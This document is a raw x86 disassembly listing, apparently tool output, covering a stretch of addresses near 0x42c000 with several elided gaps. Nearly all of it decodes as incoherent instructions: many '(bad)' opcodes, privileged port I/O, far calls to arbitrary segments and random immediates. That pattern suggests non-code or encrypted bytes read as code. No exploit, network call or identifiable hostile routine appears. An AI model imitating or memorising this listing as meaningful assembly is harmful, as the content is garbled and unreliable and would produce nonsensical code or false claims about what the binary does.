  42bf7d:	inc    ebp
  42bf7e:	sub    ah,BYTE PTR [ecx]
  42bf80:	or     DWORD PTR [edx],esp
  42bf82:	test   al,0xf9
  42bf84:	cmp    dl,ch
  42bf86:	mov    ebp,0x7d63558d
  42bf8b:	mov    ecx,0x5785acc0
  42bf90:	push   0xb
  42bf92:	popa   
  42bf93:	push   ecx
  42bf94:	xchg   ecx,eax
  42bf95:	imul   edx,eax,0x59
  42bf98:	shl    BYTE PTR ds:0xce37de3d,1
  42bf9e:	jb     0x42bf3f
  42bfa0:	retf   
  42bfa1:	dec    edx
  42bfa2:	jo     0x42c00c
  42bfa4:	sub    cl,BYTE PTR [eax-0x9]
  42bfa7:	pop    ebp
  42bfa8:	imul   BYTE PTR [edx]
  42bfaa:	aad    0xbd
  42bfac:	cmp    DWORD PTR [ebx],ebx
  42bfae:	xor    al,cl
  42bfb0:	outs   dx,BYTE PTR ds:[esi]
  42bfb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bfb2:	(bad)  
  42bfb3:	pusha  
  42bfb4:	fsubr  QWORD PTR [ecx-0x6e8f55b1]
  42bfba:	cmp    DWORD PTR [esi],0x48
  42bfbd:	xchg   ebx,eax
  42bfbe:	xchg   edi,eax
  42bfbf:	idiv   BYTE PTR [edi-0x7b]
  42bfc2:	fbstp  TBYTE PTR [esi+0x4e2df4ae]
  42bfc8:	lahf   
  42bfc9:	cwde   
  42bfca:	inc    edx
  42bfcb:	or     al,0x8d
  42bfcd:	adc    eax,DWORD PTR [edi]
  42bfcf:	mov    ch,0xc6
  42bfd1:	inc    edx
  42bfd2:	xor    DWORD PTR [ebp-0x7f],ecx
  42bfd5:	cs cs aaa 
  42bfd8:	dec    edx
  42bfd9:	js     0x42c055
  42bfdb:	clc    
  42bfdc:	inc    edi
  42bfdd:	in     eax,dx
  42bfde:	xchg   edi,ebx
  42bfe0:	outs   dx,BYTE PTR ds:[esi]
  42bfe1:	sub    al,0x41
  42bfe4:	int3   
  42bfe5:	cs sbb al,0x4f
  42bfe8:	imul   edi,esi,0x75
  42bfeb:	jbe    0x42c013
  42bfed:	xchg   DWORD PTR [ebp-0x6f],edx
  42bff0:	mov    ch,0xbb
  42bff2:	xchg   BYTE PTR [edx],bl
  42bff4:	xchg   ecx,eax
  42bff5:	ror    esi,0x61
  42bff8:	jp     0x42c06d
  42bffa:	cmp    BYTE PTR [ebp+0x76],bl
  42bffd:	cmp    bl,ch
  42bfff:	stos   DWORD PTR es:[edi],eax
  42c000:	cmp    ebx,ecx
  42c002:	mov    edx,0x48d67290
  42c007:	push   0xffffffd6
  42c009:	push   ecx
  42c00a:	inc    esi
  42c00b:	inc    edx
  42c00c:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  42c00e:	pop    ecx
  42c00f:	pop    esi
	...
  42c074:	cmp    dl,BYTE PTR [edx-0x800cd89]
  42c07a:	jg     0x42c016
  42c07c:	leave  
  42c07d:	or     DWORD PTR [edi-0x57],edi
  42c080:	pop    esp
  42c081:	mov    ebx,0xd6e0274e
  42c086:	add    DWORD PTR [eax],eax
  42c088:	add    al,0x1
  42c08a:	add    BYTE PTR [eax],al
  42c08c:	pop    ss
  42c08d:	ins    BYTE PTR es:[edi],dx
  42c08e:	test   BYTE PTR [ebx+ebx*2-0x72],bl
  42c092:	xchg   esi,eax
  42c093:	dec    ebp
  42c094:	inc    ebp
  42c095:	pop    esp
  42c096:	push   0x1d
  42c098:	ins    BYTE PTR es:[edi],dx
  42c099:	mov    bh,0x44
  42c09b:	pop    eax
  42c09c:	lahf   
  42c09d:	out    0xe2,al
  42c09f:	sahf   
  42c0a0:	pop    edi
  42c0a1:	retf   
  42c0a2:	add    ch,BYTE PTR [edx-0x4a4be534]
  42c0a8:	shr    BYTE PTR [esi],1
  42c0aa:	aaa    
  42c0ab:	fiadd  WORD PTR ds:0x9ce88919
  42c0b1:	push   0x1444a041
  42c0b6:	pop    esp
  42c0b7:	push   ss
  42c0b8:	jnp    0x42c0a8
  42c0ba:	pusha  
  42c0bb:	ret    0x9c36
  42c0be:	mov    esp,0x16f62a7f
  42c0c3:	in     al,dx
  42c0c4:	(bad)  [ebx-0x7a]
  42c0c7:	dec    ebx
  42c0c8:	clc    
  42c0c9:	sub    eax,0x4c6f40a8
  42c0ce:	fwait
  42c0cf:	inc    edi
  42c0d0:	ret    
  42c0d1:	sub    cl,ah
  42c0d3:	(bad)
  42c0d6:	and    dl,BYTE PTR [edi+0x40cef841]
  42c0dc:	ss nop
  42c0de:	xchg   edi,eax
  42c0df:	ret    0xa2f8
  42c0e2:	cmp    ch,al
  42c0e4:	and    al,0x26
  42c0e6:	mov    ch,0x3c
  42c0e8:	cmp    eax,0xef796848
  42c0ed:	mul    BYTE PTR [ebp-0x7df01736]
  42c0f3:	test   dh,bl
  42c0f5:	dec    ebp
  42c0f6:	sub    ebx,DWORD PTR [ecx+0x3f80198]
  42c0fc:	mov    esp,0xcbec1b1f
  42c101:	ss xchg ebp,eax
  42c103:	out    0x73,eax
  42c105:	add    BYTE PTR [ebx],ch
  42c107:	or     al,0x10
  42c109:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c10a:	adc    ecx,ebx
  42c10c:	pop    esi
  42c10e:	ror    BYTE PTR [edx],1
  42c110:	sbb    DWORD PTR [ebx-0x5a18ad57],esi
  42c116:	cmp    eax,0x7a995d78
  42c11b:	or     DWORD PTR [ebx+0x2e],ebp
  42c11e:	push   bx
  42c120:	push   ss
  42c121:	shl    ebx,1
  42c123:	mov    edx,0xf20ed17d
  42c128:	dec    BYTE PTR [esi+0x16c52767]
  42c12e:	xchg   ebx,eax
  42c12f:	(bad)  
  42c130:	fistp  WORD PTR [eax]
  42c132:	add    BYTE PTR [ecx],dl
  42c134:	jno    0x42c14d
  42c136:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c137:	pop    edi
  42c138:	push   ebp
  42c139:	mov    ch,0xac
  42c13b:	scas   eax,DWORD PTR es:[edi]
  42c13c:	cld    
  42c13d:	into   
  42c13e:	cmp    al,0x12
  42c140:	ror    DWORD PTR [edx+0x3419b34a],0x58
  42c147:	test   BYTE PTR [eax-0x7e],dh
  42c14a:	mov    bl,BYTE PTR [esi+0x10171b40]
  42c150:	(bad)  
  42c151:	sub    eax,esi
  42c153:	cmp    eax,0xe150cbf3
  42c158:	test   ecx,ebx
  42c15a:	push   eax
  42c15b:	fbld   TBYTE PTR [ebx+0x22]
  42c15e:	out    dx,eax
  42c15f:	sahf   
  42c160:	mov    al,0x6
  42c162:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c163:	das    
  42c164:	dec    esi
  42c165:	cmp    BYTE PTR [eax],bh
  42c167:	xlat   BYTE PTR ds:[ebx]
  42c168:	jl     0x42c14f
  42c16a:	in     al,dx
  42c16b:	dec    edi
  42c16c:	shr    BYTE PTR [eax],cl
  42c16e:	xchg   edi,eax
  42c16f:	arpl   WORD PTR [edi-0x4c],ax
  42c172:	xor    al,0x7d
  42c174:	lea    edi,[ebx]
  42c176:	add    edx,DWORD PTR [edx+eax*4]
  42c179:	sbb    eax,0xf76f55ce
  42c17e:	out    dx,al
  42c17f:	cmp    BYTE PTR [esi+0x36],bl
  42c182:	loop   0x42c1a0
  42c184:	std    
  42c185:	sub    BYTE PTR [ecx],al
  42c187:	push   edi
  42c188:	sahf   
  42c189:	push   ds
  42c18a:	mov    al,0x6a
  42c18c:	dec    esp
  42c18d:	aad    0x6f
  42c18f:	sbb    eax,0x0
	...
  42c1f4:	imul   eax,DWORD PTR [edx-0x10105133],0x90f2c76b
  42c1fe:	xchg   esp,eax
  42c1ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c200:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c201:	sub    edx,edi
  42c203:	cwde   
  42c204:	in     al,0xd7
  42c206:	add    DWORD PTR [eax],eax
  42c208:	add    al,0x1
  42c20a:	add    BYTE PTR [eax],al
  42c20c:	inc    ebp
  42c20d:	xchg   ebx,eax
  42c20e:	mov    edx,0x12fb5d11
  42c213:	push   ecx
  42c214:	adc    BYTE PTR [ebx+0xa],dh
  42c217:	fistp  WORD PTR [ecx-0xe]
  42c21a:	xchg   edi,eax
  42c21b:	not    dl
  42c21d:	push   edx
  42c21e:	jp     0x42c1e2
  42c220:	xchg   edi,eax
  42c221:	scas   al,BYTE PTR es:[edi]
  42c222:	out    dx,eax
  42c223:	mov    dh,0x55
  42c225:	imul   ebp,ecx,0x711704b8
  42c22b:	jle    0x42c237
  42c22d:	mov    al,0x1a
  42c22f:	or     al,0x98
  42c231:	dec    esi
  42c232:	(bad)  
  42c233:	rcl    edx,cl
  42c235:	mul    BYTE PTR [esp+ecx*1-0x626d1ed4]
  42c23c:	fimul  WORD PTR [esi+edx*1]
  42c23f:	gs mov bh,0x6e
  42c242:	xchg   edx,eax
  42c243:	mov    ecx,DWORD PTR [ebp+0x7e]
  42c246:	and    DWORD PTR ds:[ecx+edx*8],0x5d61a83e
  42c24e:	cli    
  42c24f:	sti    
  42c250:	or     bl,BYTE PTR [eax+0xf]
  42c253:	sub    ecx,ecx
  42c255:	dec    eax
  42c256:	xchg   DWORD PTR [ecx-0x2e1ac034],ecx
  42c25c:	sbb    bh,BYTE PTR [ecx+0x45719108]
  42c262:	mov    ebx,0x2c11d7eb
  42c267:	dec    eax
  42c268:	lods   eax,DWORD PTR ds:[esi]
  42c269:	inc    esp
  42c26a:	ret    
  42c26b:	dec    edi
  42c26c:	sti    
  42c26d:	loope  0x42c28e
  42c26f:	xchg   edi,eax
  42c270:	pop    es
  42c271:	mov    bl,0x85
  42c273:	sbb    DWORD PTR [ecx+0x19],0xcdd7d563
  42c27a:	or     eax,0xbf1b3cca
  42c27f:	mov    ds:0xdb8cc83a,eax
  42c284:	pop    eax
  42c285:	pop    eax
  42c286:	xor    eax,0xad855447
  42c28b:	(bad)  
  42c28d:	loopne 0x42c27c
  42c28f:	push   esp
  42c290:	xchg   esi,eax
  42c291:	enter  0xc84f,0xc2
  42c295:	xor    al,0xd8
  42c297:	sbb    edi,DWORD PTR [ebx+0x7c]
  42c29a:	add    cl,BYTE PTR [ebx]
  42c29c:	sti    
  42c29d:	popa   
  42c29e:	pop    es
  42c29f:	int    0x42
  42c2a1:	(bad)  
  42c2a2:	into   
  42c2a3:	and    dl,ch
  42c2a5:	scas   eax,DWORD PTR es:[edi]
  42c2a6:	xlat   BYTE PTR ds:[ebx]
  42c2a7:	mov    gs,esi
  42c2a9:	pop    ecx
  42c2aa:	mov    cl,0xa8
  42c2ac:	add    edi,ebp
  42c2ae:	stos   BYTE PTR es:[edi],al
  42c2af:	aas    
  42c2b0:	test   eax,0x6412cc2b
  42c2b5:	(bad)  
  42c2b7:	mov    ds:0x53475bc4,eax
  42c2bc:	nop
  42c2bd:	add    BYTE PTR [esp+esi*4+0x67],0x1f
  42c2c2:	lock call 0x300b37cd
  42c2c8:	sub    al,0xf6
  42c2ca:	sar    BYTE PTR [edi],0x1a
  42c2cd:	in     eax,0x49
  42c2cf:	cmp    al,0x51
  42c2d1:	stos   BYTE PTR es:[edi],al
  42c2d2:	sub    esp,esp
  42c2d4:	pop    edx
  42c2d5:	sub    edx,0xffffff84
  42c2d8:	jge    0x42c260
  42c2da:	fwait
  42c2db:	pop    es
  42c2dc:	rol    ch,0xc2
  42c2df:	call   0x5bfd:0x7aff1898
  42c2e6:	jno    0x42c313
  42c2e8:	ins    DWORD PTR es:[edi],dx
  42c2e9:	loop   0x42c35c
  42c2eb:	mov    edx,0x4e6fd156
  42c2f0:	test   al,0x20
  42c2f2:	fdiv   DWORD PTR [edx+0x2f]
  42c2f5:	retf   
  42c2f6:	add    BYTE PTR [edx+0x55],0xed
  42c2fa:	(bad)  
  42c2fb:	xchg   esp,eax
  42c2fc:	mov    dh,BYTE PTR [ebp+0x46f52c52]
  42c302:	push   ebx
  42c303:	test   eax,0x63a0cd9a
  42c308:	xchg   BYTE PTR [ecx+0x4c79fcd0],bl
  42c30e:	jl     0x42c305
	...
  42c374:	out    0xf,al
  42c376:	fldcw  WORD PTR [ebp-0x7]
  42c379:	push   esi
  42c37b:	(bad)  
  42c37c:	in     eax,dx
  42c37d:	(bad)  
  42c37e:	sub    eax,0x38f723f6
  42c383:	(bad)  
  42c384:	call   0x442c561
  42c389:	add    DWORD PTR [eax],eax
  42c38b:	add    ch,bh
  42c38d:	or     DWORD PTR [eax],0x9c78ff5f
  42c393:	push   0x4e06cd14
  42c398:	clc    
  42c399:	or     al,0x62
  42c39b:	sbb    ah,BYTE PTR [eax+edi*4-0x7ff8b3c1]
  42c3a2:	pushf  
  42c3a3:	and    al,0x42
  42c3a5:	add    DWORD PTR [ebp+0x19],0xf298d209
  42c3ac:	int3   
  42c3ad:	dec    eax
  42c3ae:	retf   
  42c3af:	ds or  eax,0xa8d14d76
  42c3b5:	mov    edx,0xd9ae325d
  42c3ba:	push   eax
  42c3bb:	in     al,0x9b
  42c3bd:	push   0xffffffa1
  42c3bf:	sbb    BYTE PTR [eax-0x64f3b3cf],cl
  42c3c5:	sbb    BYTE PTR ds:0x39492504,bl
  42c3cb:	mov    ecx,0x44fc48d9
  42c3d0:	mov    edx,DWORD PTR [ecx-0x252217b8]
  42c3d6:	and    dh,BYTE PTR ss:[ecx+0x18]
  42c3da:	xor    BYTE PTR [edi+0xf584fff],0xdc
  42c3e1:	fld    QWORD PTR [ebx]
  42c3e3:	jp     0x42c39d
  42c3e5:	mov    ebx,0xeee2ebcd
  42c3ea:	or     al,0x55
  42c3ec:	out    0xca,al
  42c3ee:	push   ss
  42c3ef:	(bad)  
  42c3f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c3f1:	dec    edx
  42c3f2:	mov    al,0x71
  42c3f4:	jge    0x42c472
  42c3f6:	mov    ss,WORD PTR [ebp+0x0]
  42c3f9:	std    
  42c3fa:	(bad)  
  42c3fc:	std    
  42c3fd:	outs   dx,DWORD PTR ds:[esi]
  42c3fe:	pop    es
  42c3ff:	loop   0x42c460
  42c401:	inc    ecx
  42c402:	aad    0xa8
  42c404:	jp     0x42c3e7
  42c406:	lds    ebx,FWORD PTR [eax]
  42c408:	push   edi
  42c409:	div    DWORD PTR [ebx+edx*4-0x5e]
  42c40d:	mov    ds:0xbf2164c7,al
  42c412:	adc    BYTE PTR [ecx],0x54
  42c415:	xor    BYTE PTR [eax-0x5f8d88f4],bl
  42c41b:	out    0x6,al
  42c41d:	in     eax,0xca
  42c41f:	dec    eax
  42c420:	jo     0x42c405
  42c422:	(bad)  
  42c423:	(bad)  
  42c424:	test   al,0xb6
  42c426:	mov    eax,0xdb744376
  42c42b:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  42c42d:	sbb    eax,0xc3ed100c
  42c432:	(bad)  
  42c435:	repnz and DWORD PTR [esi],eax
  42c438:	loopne 0x42c3e3
  42c43a:	xor    eax,ebx
  42c43c:	mov    ebx,0xa627e525
  42c441:	in     eax,dx
  42c442:	mov    ch,0x50
  42c444:	inc    esp
  42c445:	push   edi
  42c446:	lods   al,BYTE PTR ds:[esi]
  42c447:	pop    ebp
  42c448:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c449:	mov    bh,0x44
  42c44b:	into   
  42c44c:	jnp    0x42c3d7
  42c44e:	xchg   ebx,eax
  42c44f:	or     edi,DWORD PTR [ebx]
  42c451:	mov    ch,0x13
  42c453:	cld    
  42c454:	push   cs
  42c455:	sub    BYTE PTR [esi-0xf],al
  42c458:	adc    al,0x97
  42c45a:	dec    esp
  42c45b:	int    0x5
  42c45d:	fsub   QWORD PTR [eax+ebx*1]
  42c460:	cdq    
  42c461:	in     eax,dx
  42c462:	and    eax,0xa6cf4e2a
  42c467:	shl    DWORD PTR [ecx+0x41],cl
  42c46a:	mov    al,ds:0x7af4dd0c
  42c46f:	sub    esp,DWORD PTR [eax]
  42c471:	mov    cl,0x4b
  42c473:	push   esp
  42c474:	(bad)  
  42c475:	jl     0x42c4ed
  42c477:	mov    edx,0xbfb10eda
  42c47c:	into   
  42c47d:	fidivr WORD PTR [edi+edx*4]
  42c480:	sub    ebx,ebp
  42c482:	mov    eax,0x147bd0b4
  42c487:	add    DWORD PTR [esp+ebx*8+0x54e530fb],0xffffffd4
  42c48f:	add    BYTE PTR es:[eax],al
	...
  42c4f2:	add    BYTE PTR [eax],al
  42c4f4:	in     al,dx
  42c4f5:	sbb    ebp,edx
  42c4f7:	sahf   
  42c4f8:	cmc    
  42c4f9:	fsubp  st(7),st
  42c4fb:	jnp    0x42c4af
  42c4fd:	sti    
  42c4fe:	enter  0x2834,0xfc
  42c502:	cmp    eax,0x1d9ecc2
  42c507:	add    BYTE PTR [ecx+eax*1],al
  42c50a:	add    BYTE PTR [eax],al
  42c50c:	scas   eax,DWORD PTR es:[edi]
  42c50d:	push   es
  42c50e:	sti    
  42c50f:	jmp    0x40d38033
  42c514:	mov    ebp,0xccc3df9
  42c519:	xchg   BYTE PTR [eax],bh
  42c51b:	jnp    0x42c4d3
  42c51d:	or     ebp,DWORD PTR [edi-0x2bf18a5]
  42c523:	aaa    
  42c524:	loop   0x42c51f
  42c526:	push   ecx
  42c527:	jge    0x42c557
  42c529:	inc    esi
  42c52a:	add    al,BYTE PTR [ebp-0x7a9d7f48]
  42c530:	stos   BYTE PTR es:[edi],al
  42c531:	or     BYTE PTR [esi+0xa],dl
  42c534:	sbb    eax,eax
  42c536:	xchg   esp,eax
  42c537:	and    DWORD PTR [ebx+0x2c],ecx
  42c53a:	mov    ch,BYTE PTR [edx+edx*1+0x65b8311e]
  42c541:	mov    esp,0xf201f689
  42c546:	int3   
  42c547:	mov    WORD PTR [ecx+0x20],?
  42c54a:	xchg   ebp,eax
  42c54b:	fisttp QWORD PTR ds:0x5748eb9d
  42c551:	mov    al,0xea
  42c553:	mov    ah,0xfa
  42c555:	mov    ah,0x17
  42c557:	sub    esp,edx
  42c559:	ret    
  42c55a:	mov    ebx,0xa81d38ff
  42c55f:	dec    esi
  42c560:	mov    edx,ebp
  42c562:	nop
  42c563:	fwait
  42c564:	shr    DWORD PTR [eax],cl
  42c566:	shr    DWORD PTR [edx],cl
  42c568:	sbb    DWORD PTR [ebx+edx*8],ecx
  42c56b:	jmp    DWORD PTR [ebx+0x4b]
  42c56e:	cmp    edi,esi
  42c570:	popa   
  42c571:	inc    esi
  42c572:	xchg   edi,eax
  42c573:	pop    esi
  42c574:	neg    DWORD PTR [ebx]
  42c576:	lods   al,BYTE PTR ds:[esi]
  42c577:	test   eax,0x5d7e1c29
  42c57c:	int3   
  42c57d:	jmp    FWORD PTR [ebx]
  42c57f:	push   esi
  42c580:	outs   dx,BYTE PTR ds:[esi]
  42c581:	or     ebp,DWORD PTR [ecx]
  42c583:	sub    bh,BYTE PTR [ecx-0x29a396f9]
  42c589:	dec    ebx
  42c58a:	(bad)  
  42c58b:	js     0x42c554
  42c58d:	add    esp,DWORD PTR [eax-0x236495b2]
  42c593:	(bad)  
  42c594:	fadd   QWORD PTR [edx-0x4620c0]
  42c59a:	in     eax,0x1c
  42c59c:	dec    ebp
  42c59d:	dec    ecx
  42c59e:	jl     0x42c525
  42c5a0:	jo     0x42c554
  42c5a2:	enter  0x4179,0xa5
  42c5a6:	outs   dx,BYTE PTR ds:[esi]
  42c5a7:	xchg   esp,eax
  42c5a8:	push   ds
  42c5a9:	aad    0xe4
  42c5ab:	lea    esp,[eax+ebp*1+0x48]
  42c5af:	xchg   ebp,eax
  42c5b0:	xchg   BYTE PTR [ebx+0x18],ch
  42c5b3:	dec    edi
  42c5b4:	mov    dl,BYTE PTR cs:[eax+0x12]
  42c5b8:	xor    bh,BYTE PTR [esp+edi*1]
  42c5bb:	jnp    0x42c62c
  42c5bd:	ficom  WORD PTR [ebp+0x62aafc7a]
  42c5c3:	xor    eax,0xab5a4bdc
  42c5c8:	cmp    bh,BYTE PTR [edi+0x177936e]
  42c5ce:	ins    BYTE PTR es:[edi],dx
  42c5cf:	in     eax,dx
  42c5d0:	gs jae 0x42c5d7
  42c5d3:	dec    ebp
  42c5d4:	ret    0x35bc
  42c5d7:	pop    ds
  42c5d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c5d9:	cmp    BYTE PTR [ebx],0x82
  42c5dc:	inc    ebx
  42c5dd:	out    0x33,eax
  42c5df:	popf   
  42c5e0:	or     al,0xef
  42c5e2:	dec    eax
  42c5e3:	cmp    al,0xce
  42c5e5:	dec    edx
  42c5e6:	pop    ds
  42c5e7:	dec    esi
  42c5e8:	arpl   bp,si
  42c5ea:	(bad)  
  42c5eb:	int    0x4f
  42c5ed:	shl    BYTE PTR [ebx-0x49218234],1
  42c5f3:	inc    ecx
  42c5f4:	shr    dh,0x33
  42c5f7:	outs   dx,DWORD PTR ds:[esi]
  42c5f8:	cmp    ah,dh
  42c5fa:	loopne 0x42c5ff
  42c5fc:	cld    
  42c5fd:	jle    0x42c61e
  42c5ff:	jbe    0x42c5f1
  42c601:	mov    WORD PTR [ebx],ds
  42c603:	fmulp  st(4),st
  42c605:	sbb    al,0x9b
  42c607:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c608:	pusha  
  42c609:	clc    
  42c60a:	pop    DWORD PTR [esi]
  42c60c:	sub    al,0x7c
  42c60e:	cs ins DWORD PTR es:[edi],dx
	...
  42c674:	pop    ebp
  42c675:	dec    eax
  42c676:	jle    0x42c606
  42c678:	jg     0x42c638
  42c67a:	std    
  42c67b:	fstp   TBYTE PTR [ebx-0xc920395]
  42c681:	scas   eax,DWORD PTR es:[edi]
  42c682:	mov    ds:0x1daf02f,al
  42c687:	add    BYTE PTR [ecx+eax*1],al
  42c68a:	add    BYTE PTR [eax],al
  42c68c:	scas   al,BYTE PTR es:[edi]
  42c68d:	mov    al,0x5c
  42c68f:	popa   
  42c690:	sbb    BYTE PTR [edx-0x774910ee],0xe
  42c697:	adc    eax,0x9f466237
  42c69c:	outs   dx,DWORD PTR ds:[esi]
  42c69d:	fcomp  DWORD PTR [ecx+edx*1+0x5c652096]
  42c6a4:	xchg   ebp,eax
  42c6a5:	cs aaa 
  42c6a7:	test   DWORD PTR [edi-0x67f9aed8],ebp
  42c6ad:	mov    bl,0x9f
  42c6af:	fnstenv [esi]
  42c6b1:	vmread DWORD PTR [edi+0x58],ebp
  42c6b5:	aas    
  42c6b6:	fs test eax,0x9cca208e
  42c6bd:	xchg   esp,eax
  42c6be:	push   ebx
  42c6bf:	ret    0x4153
  42c6c2:	xor    eax,0x247f9b4c
  42c6c7:	mov    ds:0x4e6d7026,al
  42c6cc:	inc    esi
  42c6cd:	or     al,0x4c
  42c6cf:	out    dx,eax
  42c6d0:	call   0x542a:0x2b2bb2e
  42c6d7:	test   eax,0x66dfa438
  42c6dc:	ror    BYTE PTR [bp+si-0x57],1
  42c6e0:	aaa    
  42c6e1:	or     edx,ecx
  42c6e3:	int3   
  42c6e4:	push   esp
  42c6e5:	out    0x83,al
  42c6e7:	mov    al,ds:0xea2c1d6b
  42c6ec:	jno    0x42c744
  42c6ee:	lods   al,BYTE PTR ds:[esi]
  42c6ef:	jb     0x42c74e
  42c6f1:	stos   DWORD PTR es:[edi],eax
  42c6f2:	cmp    ebx,DWORD PTR [esi-0x2c8b3a92]
  42c6f8:	add    ah,BYTE PTR [ebx-0x4fa14fac]
  42c6fe:	sbb    BYTE PTR [ebp+esi*2-0xc4596c7],al
  42c705:	jo     0x42c6bf
  42c707:	popa   
  42c708:	sub    edi,DWORD PTR [edx+ecx*1+0x59119026]
  42c70f:	adc    al,0x7c
  42c711:	adc    bh,BYTE PTR [eax+0x1d]
  42c714:	mov    DWORD PTR [ecx+ebx*8+0x1832427b],esi
  42c71b:	pop    ss
  42c71c:	inc    ebp
  42c71d:	mov    cl,0x16
  42c71f:	not    DWORD PTR [edi+0x45d98c6a]
  42c725:	mov    DWORD PTR [edi],edx
  42c727:	jno    0x42c72b
  42c729:	cmp    cl,BYTE PTR [eax]
  42c72b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c72c:	shrd   esp,eax,cl
  42c72f:	test   eax,0x2eee90a2
  42c734:	adc    al,0xa6
  42c736:	fisttp WORD PTR [esi+0x4a67475d]
  42c73c:	in     eax,0xa4
  42c73e:	push   ebx
  42c73f:	dec    ebp
  42c740:	dec    edi
  42c741:	mov    al,ds:0x6640e892
  42c746:	push   edx
  42c747:	lods   al,BYTE PTR ds:[esi]
  42c748:	lods   eax,DWORD PTR ds:[esi]
  42c749:	dec    esi
  42c74a:	sub    DWORD PTR [ebp-0x47],esp
  42c74d:	test   al,0xa
  42c74f:	sar    BYTE PTR [esi],1
  42c751:	fld    DWORD PTR [edi-0x39]
  42c754:	push   cs
  42c755:	aam    0x37
  42c757:	fist   DWORD PTR [ebp+0x13a81c3f]
  42c75d:	mov    al,0x58
  42c75f:	fcmovnb st,st(1)
  42c761:	fdivr  QWORD PTR [eax]
  42c763:	jbe    0x42c751
  42c765:	mov    eax,0xba591ee4
  42c76a:	push   edi
  42c76b:	mov    ds:0xf5fdb82e,al
  42c770:	mov    esp,0x7dc1fb92
  42c775:	lods   al,BYTE PTR ds:[esi]
  42c776:	and    cl,ah
  42c778:	loop   0x42c7ab
  42c77a:	mov    ds:0x63a5aa18,eax
  42c77f:	(bad)  
  42c780:	fsubr  DWORD PTR [ebx]
  42c782:	mov    dl,0x74
  42c784:	shr    cl,0xf6
  42c787:	mov    BYTE PTR ds:0x4f4041ac,0x1
  42c78e:	jge    0x42c7cf
	...
  42c7f4:	cmp    BYTE PTR [ecx-0x8046a96],cl
  42c7fa:	jmp    FWORD PTR [ebp-0x5bf1e2a3]
  42c800:	fwait
  42c801:	adc    al,0x41
  42c803:	xor    ah,0xdb
  42c806:	add    DWORD PTR [eax],eax
  42c808:	add    al,0x1
  42c80a:	add    BYTE PTR [eax],al
  42c80c:	jg     0x42c839
  42c80e:	loop   0x42c83e
  42c810:	fwait
  42c811:	push   es
  42c812:	out    0x84,al
  42c814:	cmp    bl,bl
  42c816:	mov    BYTE PTR [edx-0x3],cl
  42c819:	ror    DWORD PTR [ebp+0x1e],cl
  42c81c:	cs mov bl,0xda
  42c81f:	mov    DWORD PTR [edx],eax
  42c821:	(bad)  
  42c822:	and    BYTE PTR [ebx-0x15911235],bh
  42c828:	fnstsw WORD PTR [edx+0x27]
  42c82b:	(bad)  
  42c82c:	out    dx,al
  42c82d:	sti    
  42c82e:	pushf  
  42c82f:	or     al,0xdf
  42c831:	jp     0x42c8a2
  42c833:	push   ds
  42c834:	add    BYTE PTR [esi-0x5dc0d986],0xa7
  42c83b:	jbe    0x42c86a
  42c83d:	push   cs
  42c83e:	xlat   BYTE PTR ds:[ebx]
  42c83f:	and    BYTE PTR [edi+0xd6aef37],bl
  42c845:	inc    edi
  42c846:	daa    
  42c847:	inc    ecx
  42c848:	mov    ebp,0x2d447d35
  42c84d:	test   BYTE PTR [esi+0x13],al
  42c850:	push   ebp
  42c851:	xchg   ebp,eax
  42c852:	add    eax,0x5640215
  42c857:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c858:	iret   
  42c859:	mov    ds,WORD PTR [edi+0x26dc36e2]
  42c85f:	test   DWORD PTR [eax+0x3adf8685],ecx
  42c865:	sub    al,0x86
  42c867:	add    al,BYTE PTR [ecx]
  42c869:	and    eax,0x727c5f3f
  42c86e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c86f:	cmp    DWORD PTR [eax+0x26],esp
  42c872:	push   es
  42c873:	or     dh,BYTE PTR [ecx+eiz*4-0x41]
  42c877:	sbb    esp,DWORD PTR [ebx-0x6a]
  42c87a:	inc    ecx
  42c87b:	push   es
  42c87c:	scas   eax,DWORD PTR es:[edi]
  42c87d:	rcl    bl,1
  42c87f:	dec    eax
  42c880:	mov    ds:0xff6535bc,eax
  42c885:	sbb    DWORD PTR [ebx+eiz*2-0x4bf55d99],0x151139ff
  42c890:	push   edx
  42c891:	bound  esi,QWORD PTR [ecx+0x36]
  42c894:	sub    BYTE PTR [ebp+0x19],dh
  42c897:	pop    edx
  42c898:	lods   eax,DWORD PTR ds:[esi]
  42c899:	jo     0x42c8e0
  42c89b:	outs   dx,BYTE PTR ds:[esi]
  42c89c:	xchg   ecx,eax
  42c89d:	xchg   edi,eax
  42c89e:	std    
  42c89f:	jns    0x42c911
  42c8a1:	gs inc esp
  42c8a3:	mov    esi,0x60e4958c
  42c8a8:	pop    edx
  42c8a9:	xor    ebx,0xffffffef
  42c8ac:	push   ecx
  42c8ad:	ja     0x42c89e
  42c8af:	adc    ebp,DWORD PTR [esi-0xc]
  42c8b2:	mov    bl,0x5b
  42c8b4:	sar    BYTE PTR ds:0x90790bbf,0x16
  42c8bb:	in     eax,0x6b
  42c8bd:	in     al,0x9f
  42c8bf:	cmp    esp,DWORD PTR [edx]
  42c8c1:	xchg   ebx,eax
  42c8c2:	add    edi,DWORD PTR [ebp-0x23]
  42c8c5:	inc    ebp
  42c8c6:	fld    QWORD PTR [eax+edx*2-0x42]
  42c8ca:	loop   0x42c8a7
  42c8cc:	enter  0x7582,0x88
  42c8d0:	fldenv [edx+0x2]
  42c8d3:	fnstsw WORD PTR [edx+0x52]
  42c8d6:	sbb    BYTE PTR [ebp+0x3b],cl
  42c8d9:	call   0x4223:0xd7579908
  42c8e0:	adc    DWORD PTR [ecx+0x1910a20f],0x4a
  42c8e7:	pusha  
  42c8e8:	je     0x42c901
  42c8ea:	les    esp,FWORD PTR [edx-0x42f1383b]
  42c8f0:	push   ss
  42c8f1:	in     eax,dx
  42c8f2:	loope  0x42c87b
